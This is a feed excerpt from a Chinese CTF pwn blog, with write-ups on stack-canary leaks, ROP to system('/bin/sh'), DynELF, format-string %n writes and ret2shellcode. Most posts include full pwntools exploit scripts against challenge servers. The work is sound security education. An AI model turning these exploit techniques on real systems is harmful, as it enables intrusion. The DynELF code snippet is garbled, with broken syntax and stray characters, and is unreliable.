  printf(&quot;Hello %s\n&quot;, buf);
  write(1, &quot;Please leave a message(Within 0x200 Length):&quot;, 0x2CuLL);
  read(0, v5, 0x300uLL);
  printf(&quot;your message is :%s \nBye~&quot;, v5);
  return 0;
}
</code></pre>
<p><img src="https://cc-nianchu.github.io/post-images/1626860885192.png" alt="" loading="lazy"><br>
主要关注.text:000000000040082C                 mov     rax, fs:28h<br>
和.text:0000000000400835                  mov    [rbp+var_8], rax<br>
<img src="https://cc-nianchu.github.io/post-images/1626861002377.png" alt="" loading="lazy"><br>
canary存在rbp+var_8，可以在0x40082C下断点，观察下。<br>
下断点在0x40082C并输入r运行<br>
<img src="https://cc-nianchu.github.io/post-images/1626861151630.png" alt="" loading="lazy"><br>
输入n后发现rax的寄存器从0x400814变成0xfd158aa9e4871200<br>
并且发现rax的值要赋给rbp-8<br>
canary在内存是这样的<br>
<img src="https://cc-nianchu.github.io/post-images/1626861272714.png" alt="" loading="lazy"><br>
所以现在的思路是首先依据第一次回显泄露canary的值，第二次通过利用泄露的canary值实现栈溢出。<br>
64位程序优先通过寄存器rdi传参，所以先找pop rdi ； ret<br>
利用命令ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;<br>
可以找到如下结果，我们选择0x400963（选个简单的）<br>
还差一个/bin/sh我们可以在ida上按shift+F12 找到<br>
<img src="https://cc-nianchu.github.io/post-images/1626861450260.png" alt="" loading="lazy"><br>
最终如下<br>
<img src="https://cc-nianchu.github.io/post-images/1626861486228.jpg" alt="" loading="lazy"><br>
完整exp：</p>
<pre><code># -- coding:utf-8 
from pwn import *
#p = process(&quot;./pwn4&quot;)
context.log_level = 'debug'
p = remote(&quot;114.67.246.176&quot;,15575)
p.recvuntil(&quot;(Within 36 Length)&quot;)
payload=&quot;a&quot;*(0x240-0x8) #canary在rbp-8的位置
p.sendline(payload)
#0a	12	87	e4	a9	8a	15	fd
#\n         0a是\n 16进制
canary_addr=u64('\x00'+p.recv(7)) 
#system函数地址，用ida可以查
system_addr = 0x400660
#ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;
#0x0000000000400963 : pop rdi ; ret
pop_rdi_ret = 0x400963
#/bin/sh地址 ida shift+F12可获得
binsh_addr =0x601068
payload ='a'*(0x210-0x8)

payload += p64(canary_addr)
#rbp
payload += p64(0x1)

payload += p64(pop_rdi_ret)

payload += p64(binsh_addr)

payload += p64(system_addr)

p.recv()
p.sendline(payload)
p.interactive()
</code></pre>
<p>最后来个笔记<br>
<img src="https://cc-nianchu.github.io/post-images/1626862721188.jpg" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DynELF]]></title>
        <id>https://cc-nianchu.github.io/post/dynelf/</id>
        <link href="https://cc-nianchu.github.io/post/dynelf/">
        </link>
        <updated>2021-07-21T04:27:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="dynelf原理">DynELF原理</h2>
<p>通过信息泄露漏洞，DynELF将对任意内存进行搜索,它首先找到ELF文件在内存中的基地址，然后定位到libe并对其进行解析，从而找到所需函数符号的地址，具体步骤如下。</p>
<p>(1)搜索内存找到字符串“\x7ELF”， 该字符串的地址即为ELF的基地址;</p>
<p>(2)解析ELF文件，得到DYNAMIC段的基地址，并通过该地址得到link map链表，此时有两种方法:一种 是通过.dynamic里的DT DEBUG,它是一个指向 structr debug的指针，其第二个元素指向link map;另一种是通过.got.plt节，其前3项分别是.dynamic、link_ map 和dl _runtime resolve的地址;</p>
<p>(3 )遍历link map,对比1_ name找到libc后，通过1 addr获得libc的基地址;</p>
<p>( 4)解析libc,通过DT_ _GNU HASH、DT STRTAB:和DT SYMTAB分别得到哈希表( .gnu hash/ .hash)、字符串表(sttab )和符号表( symtab );</p>
<p>(5)通过哈希表找到所需函数(如system )的内存地址。</p>
<h2 id="例题-xdctf-2015pwn200-攻防世界进阶区第二题">例题 XDCTF 2015:pwn200  攻防世界进阶区第二题</h2>
<p>获得题目后先checksec pwn_200</p>
<pre><code> Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

</code></pre>
<p>打开ida32 F5获得伪代码</p>
<pre><code>int __cdecl main()
{
  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF

  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
  memset(&amp;buf[24], 0, 0x4Cu);
  setbuf(stdout, buf);
  write(1, buf, strlen(buf));
  sub_8048484();
  return 0;
}
ssize_t sub_8048484()
{
  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF

  setbuf(stdin, buf);
  return read(0, buf, 0x100u);
}
</code></pre>
<h3 id="程序分析">程序分析</h3>
<p>漏洞比较明显，sub 80484840函数试图读取010个字节到个0x6e字节大小的buf上，存在缓冲区溢出漏洞。由于没有Canay,我们可以很轻松地在栈上布置ROP链、并控制EIP。只需要注意32位程序通过栈传递参数。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>(1)利用栈溢出，在栈上布置ROP链，修改返回地址，从而控制EIP:</p>
<p>(2 )利用wrieO函数构造DynELF的leak函数，进行信息泄露，从而得到libe,从中查找system0函数的地址;</p>
<p>(3)利用read(0函数将字符串“in/hsx00&quot; 读人.bss 节;</p>
<p>(4)调用system(&quot;/bin/sh&quot;),获得shell.</p>
<p>第一阶段利用DynELF泄露得到system()函数的内存地址，leak func()如下所示。</p>
<pre><code>def leak func (addr) :

io. recvline ()

payload= &quot;А&quot;*(0хбс +4)

payload += p32 (write_ plt)

# write(1, addr, 4)

payload += p32 (pppr_addr)

clean the stack

payload += p32 (1)

payload += p32 (addr)

payload += p32 (4)

payload += p32(_start_addr)                 # start again

io. send (payload)

data = io. recv(4)

log. info(&quot;leaking: 0x%x -&gt; %s&quot; 8 (addr, (data or '') .encode('hex')))
return data
</code></pre>
<p>每次执行write()函数后，都需要一个&quot;pop;pop;pop;ret&quot;的gadget将3个参数弹出，从而使栈达到平衡，然后再返回到start函数开启下一轮，从而满足DynELF需要循环泄漏的条件</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用格式化字符串漏洞获得Canary进行栈溢出]]></title>
        <id>https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/</id>
        <link href="https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/">
        </link>
        <updated>2021-07-18T02:21:16.000Z</updated>
        <content type="html"><![CDATA[<p>题目在攻防世界进阶区第一题Mary_Morton，也是一道基础题<br>
拿到题目先checksec一下</p>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<p>发现是64位程序，而且开了Canary和NX保护 打开ida64 F5获得伪代码</p>
<pre><code>void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_4009FF();
  puts(&quot;Welcome to the battle ! &quot;);
  puts(&quot;[Great Fairy] level pwned &quot;);
  puts(&quot;Select your weapon &quot;);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_4009DA();
      __isoc99_scanf(&quot;%d&quot;, &amp;v3);
      if ( v3 != 2 )
        break;
      sub_4008EB();
    }
    if ( v3 == 3 )
    {
      puts(&quot;Bye &quot;);
      exit(0);
    }
    if ( v3 == 1 )
      sub_400960();
    else
      puts(&quot;Wrong!&quot;);
  }
}
</code></pre>
<p>很明显是一道给选择的题目，打开题目函数</p>
<pre><code>int sub_4009DA()
{
  puts(&quot;1. Stack Bufferoverflow Bug &quot;);
  puts(&quot;2. Format String Bug &quot;);
  return puts(&quot;3. Exit the battle &quot;);
}
</code></pre>
<p>题目已经告诉我们1是栈溢出，2是字符串格式化漏洞，但是因为开了Canary，所以要是需要栈溢出我们需要获得Canary的值，才能进行栈溢出。</p>
<pre><code>函数一
unsigned __int64 sub_400960()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x100uLL);
  printf(&quot;-&gt; %s\n&quot;, buf);
  return __readfsqword(0x28u) ^ v2;
}
函数二
unsigned __int64 sub_4008EB()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x7FuLL);
  printf(buf);
  return __readfsqword(0x28u) ^ v2;
}
后门函数
int sub_4008DA()
{
  return system(&quot;/bin/cat ./flag&quot;);
}
</code></pre>
<p>因为有canary保护，return的是v2，所以v2应该就是canary的值<br>
<img src="https://cc-nianchu.github.io/post-images/1626575797030.png" alt="" loading="lazy"><br>
思路：首先利用字符串漏洞，泄露出canary的值，然后在函数要返回的时候再填回去，之后利用栈溢出，让其返回到后门函数。<br>
字符串格式化漏洞先手计算偏移量</p>
<pre><code>Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

AAAA 0x7fffc952c6c0 0x7f 0x7f08d64a3151 (nil) (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xa7025 (nil) (nil) (nil) (nil) (nil)
</code></pre>
<p>在这里发现字符串偏移量为6，再确定canary和输入的参数之间的偏移<br>
buf到v2   0x90-0x08=0x88<br>
因为这是64位的程序，每个格式化字符串都是8字节，同理32位是4字节<br>
所以0x88=136   136/8=17    所以总偏移量为17+6=23<br>
所以第一次先泄漏canary<br>
第一个payload='%23$p'<br>
然后canary=int(recv(16),16)   接受16个字节<br>
然后print canary<br>
构造第二个payload ='a'*0x88+p64(canary)+'a'*8+p64(后门函数地址)<br>
exp如下:</p>
<pre><code>from pwn import *

#r=process('./Mary_Morton')
r=remote('111.200.241.244',63833)

#r.recvuntil('3. Exit the battle')
r.sendline('2')

r.sendline('%23$p')

r.recvuntil('0x')
canary=int(r.recv(16),16)
print (canary)

door_addr=0x4008da
payload='a'*0x88+p64(canary)+'a'*8+p64(door_addr)
#r.recvuntil('3. Exit the battle')
r.sendline('1')
r.sendline(payload)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[格式字符串]]></title>
        <id>https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/</id>
        <link href="https://cc-nianchu.github.io/post/ge-shi-zi-fu-chuan/">
        </link>
        <updated>2021-07-16T06:03:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="攻防世界新手题cgfsb">攻防世界新手题CGfsb</h2>
<p>这道题是在攻防世界新手题 题目介绍为：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用<br>
拿到题目后我们先用最基础的checksec功能check一下</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>在这里我们发现程序是32位的  用IDA32位打开文件</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD buf[2]; // [esp+1Eh] [ebp-7Eh] BYREF
  __int16 v5; // [esp+26h] [ebp-76h]
  char s[100]; // [esp+28h] [ebp-74h] BYREF
  unsigned int v7; // [esp+8Ch] [ebp-10h]

  v7 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf[0] = 0;
  buf[1] = 0;
  v5 = 0;
  memset(s, 0, sizeof(s));
  puts(&quot;please tell me your name:&quot;);
  read(0, buf, 0xAu);
  puts(&quot;leave your message please:&quot;);
  fgets(s, 100, stdin);
  printf(&quot;hello %s&quot;, (const char *)buf);
  puts(&quot;your message is:&quot;);
  printf(s);
  if ( pwnme == 8 )
  {
    puts(&quot;you pwned me, here is your flag:\n&quot;);
    system(&quot;cat flag&quot;);
  }
  else
  {
    puts(&quot;Thank you!&quot;);
  }
  return 0;
}
</code></pre>
<p>根据新手提示 我们很快发现printf(s)；这句话有问题，平时我们学C语言，正确的应该是printf(&quot;%n&quot;,s);<br>
printf（&quot;格式化字符串&quot;,参数...)</p>
<pre><code class="language-格式化说明符有这些：">%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数
</code></pre>
<p>我们需要注意的是%n 这个格式化字符串，它的功能是将%n 之前打印出来的字符<br>
个数，赋值给一个变量。看伪代码，我们发现让pwnme==8;这句话成立之后我们就可以运行cat flag 获得flag<br>
因此我们需要：<br>
1、我们需要将 pwnme 的地址输入到 s（也就是 message）中去<br>
2、在合适的位置上加一个<code>%n</code>，使其与我们输入的地址对应从而造成漏洞利用<br>
但我们需要知道输入进去的数据在栈中偏移了多少，知道偏移量后我们就可以利用pwnme。<br>
运行程序:</p>
<pre><code>please tell me your name:
nianchu
leave your message please:
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
hello nianchu
your message is:
AAAA 0xffc1cc3e 0xf7f4b5c0 0xffc1cc8c 0xf7f91a9c 0x1 0xf7f64410 0x696e0001 0x68636e61 0xa75 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
Thank you!
</code></pre>
<p>在这里我们数数AAAA对应的应该是0x41414141，我们发现0x41414141在第10个，偏移量便为10<br>
需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们要用到第十个，所以是%10$n<br>
所以EXP就有了</p>
<pre><code>from pwn import*
#q=precess(&quot;./CGfsb&quot;)
q=remote('111.200.241.244',51786)

pwnme_addr=0x0804A068
payload=p32(pwnme_addr)+'ssbb'+'%10$n'
q.recvuntil(&quot;please tell me your name:\n&quot;)
q.sendline('nianchu')
q.recvuntil(&quot;leave your message please:\n&quot;)
q.sendline(payload)

q.interactive()
</code></pre>
<h2 id="buu上的第五空间2019-决赛pwn5">buu上的[第五空间2019 决赛]PWN5</h2>
<p>这是一道很明显格式化字符串不过应该还有其他的解法以后学了再来用其他的方法，主要是发现了/bin/sh<br>
这道题我是用格式化字符串做的但是不是很熟练做了好久，又get到新知识。<br>
首先checksec一下pwn5文件</p>
<pre><code>Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
</code></pre>
<p>然后用ida32位打开pwn5文件 按F5打开伪代码</p>
<pre><code>int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &amp;a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open(&quot;/dev/urandom&quot;, 0);
  read(fd, &amp;dword_804C044, 4u);        //随机4位数
  printf(&quot;your name:&quot;);
  read(0, buf, 0x63u);
  printf(&quot;Hello,&quot;);
  printf(buf);
  printf(&quot;your passwd:&quot;);
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
     puts(&quot;ok!!&quot;);
     system(&quot;/bin/sh&quot;);
  }
  else
  {
     puts(&quot;fail&quot;);
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
     sub_80493D0();
  return result;
}
</code></pre>
<p>能运行system(&quot;/bin/sh&quot;)很明显是要atoi(nptr)=dword_804C044，这是一道验证账号密码题目，密码在上面会随机4位数，但是我们利用格式化字符串将密码改成自己想要的就行了，%d读取数字，%x读取地址，%s读取任意地址的内容，%n任意地址写入。 例如aaaa%n=4,因为要写入4位数所以我们在0x804C044这个地址上得分4byte<br>
<img src="https://cc-nianchu.github.io/post-images/1626489125752.png" alt="" loading="lazy"><br>
这里配合上面讲的%10<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">道</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi></mrow><annotation encoding="application/x-tex">n，一样的道理，%10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span></span></span></span>n是一次占4个字节，因此我们分开。<br>
首先我们得找到偏移量，打开程序输入AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</p>
<pre><code>your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Hello,AAAA 0xffe1b8d8 0x63 (nil) 0xf7f8da9c 0x3 0xf7f60410 0x1 (nil) 0x1 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
��s��your passwd:
</code></pre>
<p>我们可以发现第十个就是偏移量，现在也找到偏移量也找到函数地址0x804c044，<br>
而密码就是4 * len(p32()) = 0x10直接上EXP</p>
<pre><code>from pwn import*
#q=process(&quot;./pwn5&quot;)

q=remote('node4.buuoj.cn',28993)

addr=0x0804c044

payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)

payload+='%10$hhn%11$hhn%12$hhn%13$hhn'
#payload+='%10$n%11$n%12$n%13$n'
#q.recvuntil(&quot;your name:\n&quot;)
q.sendline(payload)

#q.recvuntil(&quot;your passwd:\n&quot;)
payload=str(0x10101010)

q.sendline(payload)

q.interactive()
</code></pre>
<p>另外提醒一下  py文件不能起名为pwn.py，我也不懂为什么，反正起名了这个我搞了好久都是有错误上网找了好久都不行，后面发现改了个名字就能运行了。。。。。。。。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[shellcode 基础]]></title>
        <id>https://cc-nianchu.github.io/post/shellcode-ji-chu/</id>
        <link href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
        </link>
        <updated>2021-07-14T12:17:14.000Z</updated>
        <summary type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
]]></summary>
        <content type="html"><![CDATA[<p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<p>在这里发现是32位程序而且开了NX保护打开IDA32按F5进入main函数伪代码</p>
<pre><code>    int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
<!-- more -->
<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
<!-- more -->
<p>然后确定栈溢出覆盖返回地址的位置，可以手动计算，这里使用cyclic；<br>
cyclic pattern是一个很好用的功能，pattern就是指一个字符串。在完成溢出题目时，使用cyclic pattern可以大大减少计算溢出点的时间。<br>
<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
可以发现在0x62616164中溢出<br>
输入cyclic -l 0x0626164  可以得到偏移量为112<br>
因此我们可以构造payload<br>
payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
EXP如下</p>
<pre><code>from pwn import *

q = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
q.interactive()
</code></pre>
]]></content>
    </entry>
</feed>